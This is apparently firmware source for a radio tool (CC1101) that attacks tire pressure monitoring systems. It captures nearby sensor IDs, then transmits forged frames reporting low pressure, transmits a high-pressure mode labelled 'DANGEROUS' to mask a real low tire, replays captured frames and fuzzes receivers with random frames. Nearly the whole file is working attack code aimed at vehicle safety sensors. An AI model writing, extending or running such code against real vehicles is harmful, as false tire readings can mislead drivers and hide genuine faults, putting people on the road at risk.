#include "tpms_spoofer.h"
#include "tx_arm.h"
#include "drivers/cc1101_driver.h"
#include "hardware.h"
#include <set>
#include "tool_output_helper.h"
#include "result_renderers.h"
#include "audit_log.h"

namespace TPMSSpoofer {

// TPMS Sensor frame format (315/433 MHz)
// Typical: [Header:1] [SensorID:4] [Pressure:1] [Temp:1] [Checksum:1]
// Modulation: FSK at ~10 kHz deviation
// Transmission rate: ~100ms per frame

TPMSResult captureTPMSSensors(uint32_t captureDurationMs, uint32_t frequency) {
    TPMSResult result;
    result.success = false;

    if (!Hardware::isCC1101Ready()) {
        result.error = "CC1101 not initialized";
        return result;
    }

    Serial.printf("[TPMS Capture] Listening at %lu MHz for %lums\n",
                  frequency / 1000000, captureDurationMs);

    CC1101Driver::Config cfg = {
        .frequency = frequency == 315000000 ? 315000000 : 433000000,
        .baudrate = 1000,
        .modulation = 0,  // FSK for TPMS
        .rxEnabled = true,
        .txEnabled = false
    };

    // Configure CC1101 for reception
    CC1101Driver::setRX(true);

    uint32_t startTime = millis();
    std::vector<TPMSSensor> captured;
    std::set<uint32_t> uniqueIDs;

    while ((millis() - startTime) < captureDurationMs) {
        if (CC1101Driver::isRXReady()) {
            uint8_t frameData[32];
            uint8_t frameLen = 0;
            if (CC1101Driver::receive(frameData, &frameLen, sizeof(frameData))) {

            if (frameLen >= 7) {  // Minimum TPMS frame size
                // Parse TPMS frame: [Header:1] [ID:4] [Pressure:1] [Temp:1] [CRC:1+]
                uint32_t sensorID = (frameData[1] << 24) | (frameData[2] << 16) |
                                   (frameData[3] << 8) | frameData[4];

                if (uniqueIDs.find(sensorID) == uniqueIDs.end()) {
                    uniqueIDs.insert(sensorID);
                    TPMSSensor sensor;
                    sensor.sensorID = sensorID;
                    sensor.pressure = frameData[5];
                    sensor.temperature = frameData[6];

                    captured.push_back(sensor);
                    result.spoofedSensorIDs.push_back(sensor.sensorID);

                    int rssi = CC1101Driver::getRSSI();
                    Serial.printf("[TPMS] Captured ID:0x%08lX Pressure:%d PSI Temp:%dC RSSI:%d dBm\n",
                                 sensor.sensorID, sensor.pressure, sensor.temperature, rssi);
                }
            }
            }
        }
        delay(100);
    }

    if (captured.size() > 0) {
        result.success = true;
        result.durationMs = millis() - startTime;
        result.framesTransmitted = captured.size();
        result.attackDescription = String("Captured ") + String(captured.size()) + " TPMS sensors";
        Serial.printf("[TPMS] Captured %zu unique sensors\n", captured.size());
    } else {
        result.error = "No TPMS signals detected";
    }

    CC1101Driver::setTX(true);  // Return to TX mode
    return result;
}

TPMSResult spoofTPMSLow(const TPMSConfig& config) {
    TPMSResult result;
    result.success = false;
    result.framesTransmitted = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (!Hardware::isCC1101Ready()) {
        result.error = "CC1101 not initialized";
        return result;
    }

    Serial.printf("[TPMS Spoof] LOW pressure attack on %zu sensors for %lums\n",
                  config.targetSensors.size(), config.durationMs);

    CC1101Driver::setFrequency(config.frequency == 315000000 ? 315000000 : 433000000);
    CC1101Driver::setTX(true);

    uint32_t startTime = millis();

    while ((millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) break;

        for (const auto& sensor : config.targetSensors) {
            uint8_t frame[8];
            frame[0] = 0xA4;  // TPMS header
            frame[1] = (sensor.sensorID >> 24) & 0xFF;
            frame[2] = (sensor.sensorID >> 16) & 0xFF;
            frame[3] = (sensor.sensorID >> 8) & 0xFF;
            frame[4] = sensor.sensorID & 0xFF;
            frame[5] = 20;    // LOW pressure (20 PSI instead of 35)
            frame[6] = 70;    // Temperature
            frame[7] = 0xA4 ^ frame[1] ^ frame[2] ^ frame[3] ^ frame[4] ^ frame[5] ^ frame[6];

            if (CC1101Driver::transmit(frame, 8)) {
                result.framesTransmitted++;
                Serial.printf("[TPMS TX] ID:0x%08lX Spoofed Pressure:20 PSI\r",
                             sensor.sensorID);
            }
        }

        delay(config.targetSensors.size() > 1 ? 200 : 100);
    }

    result.success = (result.framesTransmitted > 0);
    result.durationMs = millis() - startTime;
    result.attackDescription = String("Spoofed LOW pressure on ") + String(config.targetSensors.size()) + " tires";

    if (result.success) {
        Serial.printf("\n[TPMS Spoof] Sent %lu spoofed frames\n", result.framesTransmitted);
    } else {
        result.error = "Spoofing failed";
    }

    return result;
}

TPMSResult spoofTPMSHigh(const TPMSConfig& config) {
    TPMSResult result;
    result.success = false;
    result.framesTransmitted = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (!Hardware::isCC1101Ready()) {
        result.error = "CC1101 not initialized";
        return result;
    }

    Serial.printf("[TPMS Spoof] HIGH pressure spoofing (DANGEROUS) on %zu sensors\n",
                  config.targetSensors.size());

    CC1101Driver::setFrequency(config.frequency == 315000000 ? 315000000 : 433000000);
    CC1101Driver::setTX(true);

    uint32_t startTime = millis();

    while ((millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) break;

        for (const auto& sensor : config.targetSensors) {
            uint8_t frame[8];
            frame[0] = 0xA4;
            frame[1] = (sensor.sensorID >> 24) & 0xFF;
            frame[2] = (sensor.sensorID >> 16) & 0xFF;
            frame[3] = (sensor.sensorID >> 8) & 0xFF;
            frame[4] = sensor.sensorID & 0xFF;
            frame[5] = 60;    // HIGH pressure (60 PSI - dangerously high)
            frame[6] = 70;
            frame[7] = 0xA4 ^ frame[1] ^ frame[2] ^ frame[3] ^ frame[4] ^ frame[5] ^ frame[6];

            if (CC1101Driver::transmit(frame, 8)) {
                result.framesTransmitted++;
                Serial.printf("[TPMS TX] ID:0x%08lX DANGEROUSLY HIGH:60 PSI\r",
                             sensor.sensorID);
            }
        }

        delay(150);
    }

    result.success = (result.framesTransmitted > 0);
    result.durationMs = millis() - startTime;
    result.attackDescription = "DANGEROUS: Spoofed HIGH pressure to mask real low tire";

    if (result.success) {
        Serial.printf("\n[TPMS Spoof] Sent %lu dangerous spoofed frames\n", result.framesTransmitted);
    } else {
        result.error = "Spoofing failed";
    }

    return result;
}

TPMSResult replayTPMSFrame(const TPMSConfig& config, const TPMSSensor& targetSensor) {
    TPMSResult result;
    result.success = false;
    result.framesTransmitted = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (!Hardware::isCC1101Ready()) {
        result.error = "CC1101 not initialized";
        return result;
    }

    Serial.printf("[TPMS Replay] Replaying sensor 0x%08lX for %lums\n",
                  targetSensor.sensorID, config.durationMs);

    CC1101Driver::setFrequency(config.frequency == 315000000 ? 315000000 : 433000000);
    CC1101Driver::setTX(true);

    uint32_t startTime = millis();

    while ((millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) break;

        uint8_t frame[8];
        frame[0] = 0xA4;
        frame[1] = (targetSensor.sensorID >> 24) & 0xFF;
        frame[2] = (targetSensor.sensorID >> 16) & 0xFF;
        frame[3] = (targetSensor.sensorID >> 8) & 0xFF;
        frame[4] = targetSensor.sensorID & 0xFF;
        frame[5] = targetSensor.pressure;
        frame[6] = targetSensor.temperature;
        frame[7] = 0xA4 ^ frame[1] ^ frame[2] ^ frame[3] ^ frame[4] ^ frame[5] ^ frame[6];

        if (CC1101Driver::transmit(frame, 8)) {
            result.framesTransmitted++;
        }

        delay(100);  // ~10 Hz replay rate
    }

    result.success = (result.framesTransmitted > 0);
    result.durationMs = millis() - startTime;
    result.attackDescription = String("Replay: ") + String(result.framesTransmitted) + " duplicate frames";

    return result;
}

TPMSResult fuzzyTPMSFrames(const TPMSConfig& config) {
    TPMSResult result;
    result.success = false;
    result.framesTransmitted = 0;

    if (!TxArm::isArmed()) {
        result.error = "TX not armed";
        return result;
    }

    if (!Hardware::isCC1101Ready()) {
        result.error = "CC1101 not initialized";
        return result;
    }

    Serial.printf("[TPMS Fuzz] Fuzzing TPMS subsystem for %lums\n", config.durationMs);

    CC1101Driver::setFrequency(config.frequency == 315000000 ? 315000000 : 433000000);
    CC1101Driver::setTX(true);

    uint32_t startTime = millis();

    while ((millis() - startTime) < config.durationMs) {
        if (!TxArm::isArmed()) break;

        uint8_t fuzzFrame[8];
        for (int i = 0; i < 8; i++) {
            fuzzFrame[i] = esp_random() & 0xFF;
        }

        if (CC1101Driver::transmit(fuzzFrame, 8)) {
            result.framesTransmitted++;
            Serial.printf("[TPMS Fuzz] TX malformed frame\r");
        }

        delay(50);
    }

    result.success = (result.framesTransmitted > 0);
    result.durationMs = millis() - startTime;
    result.attackDescription = "Fuzzing: Sent malformed TPMS frames";

    return result;
}

TPMSResult analyzeTPMSData(const std::vector<TPMSSensor>& sensors) {
    TPMSResult result;
    result.success = (sensors.size() > 0);

    Serial.printf("[TPMS Analyzer] Analyzing %zu sensors\n", sensors.size());

    for (const auto& sensor : sensors) {
        String status = "Normal";
        if (sensor.pressure < 30) {
            status = "LOW";
        } else if (sensor.pressure > 50) {
            status = "HIGH";
        }

        result.spoofedSensorIDs.push_back(sensor.sensorID);
        Serial.printf("[TPMS] ID:0x%08lX Pressure:%d PSI Temp:%dC [%s]\n",
                     sensor.sensorID, sensor.pressure, sensor.temperature, status.c_str());
    }

    result.attackDescription = String("Analyzed ") + String(sensors.size()) + " TPMS sensors";
    return result;
}

}  // namespace TPMSSpoofer
